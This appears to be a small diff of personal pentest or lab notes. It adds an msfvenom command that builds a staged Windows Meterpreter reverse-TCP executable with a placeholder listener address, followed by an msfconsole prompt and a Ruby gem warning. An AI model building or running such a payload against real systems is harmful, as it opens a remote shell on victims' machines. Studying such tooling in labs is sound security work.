@@ -1,3 +1,6 @@
+                                                                  "WINDOWS STAGED PAYPLOAD"
+                       FOR WINDOWS - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_address> LPORT=4444 -f exe -o staged.exe
+
 ]
 └─# msfconsole
 /usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
